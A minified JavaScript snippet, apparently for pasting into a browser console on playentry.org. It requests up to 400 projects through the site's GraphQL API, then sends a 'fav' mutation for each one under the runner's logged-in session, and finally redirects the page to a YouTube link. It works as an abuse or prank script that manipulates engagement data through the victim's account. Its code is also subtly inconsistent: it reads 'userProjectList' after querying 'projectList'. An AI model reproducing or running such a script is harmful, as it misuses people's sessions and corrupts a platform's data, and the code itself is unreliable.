fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\\n    query SELECT_PROJECTS(\\n        \\n    $query: String \\n    $categoryCode: String\\n    $staffPicked: Boolean\\n    $ranked: Boolean\\n    $parent: String\\n    $origin: String\\n    $discovery: String\\n    $pageParam: PageParam\\n    $term: String\\n    $queryTitleOnly:Boolean\\n    $isChallenge:Boolean\\n    $searchAfter: JSON\\n    $searchType: String\\n    $cacheKey: String\\n\\n    ) {\\n        projectList(\\n            \\n    query: $query\\n    categoryCode: $categoryCode\\n    staffPicked: $staffPicked\\n    ranked: $ranked\\n    parent: $parent\\n    origin: $origin\\n    discovery: $discovery\\n    pageParam: $pageParam\\n    term: $term\\n    queryTitleOnly: $queryTitleOnly\\n    isChallenge: $isChallenge\\n    searchAfter: $searchAfter\\n    searchType: $searchType\\n    cacheKey: $cacheKey\\n\\n        ) {\\n            total\\n            list {\\n                \\n    id\\n    name\\n    user {\\n        id\\n        username\\n        nickname\\n        profileImage {\\n            id\\n            filename\\n            imageType\\n        }\\n    }\\n    thumb\\n    isopen\\n    isPracticalCourse\\n    category\\n    categoryCode\\n    created\\n    updated\\n    special\\n    isForLecture\\n    isForStudy\\n    isForSubmit\\n    hashId\\n    complexity\\n    staffPicked\\n    ranked\\n    visit\\n    likeCnt\\n    comment\\n\\n            }\\n            last\\n            searchAfter\\n        }\\n    }\\n","variables":{"query":"","term":"all","listName":"projectList","searchType":"scroll","pageParam":{"sort":"published","display":400}}}',method:"POST"}).then(e=>e.json()).then(e=>{var n=e.data.userProjectList.list;console.log(n),n.forEach(function(e){fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:`{"query":"\\n    mutation FAV($target: String, $targetSubject: String, $targetType: String, $groupId: ID) {\\n        fav(target: $target, targetSubject: $targetSubject, targetType: $targetType, groupId: $groupId) {\\n            \\n    target\\n    targetSubject\\n    targetType\\n\\n        }\\n    }\\n","variables":{"target":"${e.id}","targetSubject":"project","targetType":"individual"}}`,method:"POST"})})}),location.href="https://youtu.be/dQw4w9WgXcQ?t=2";
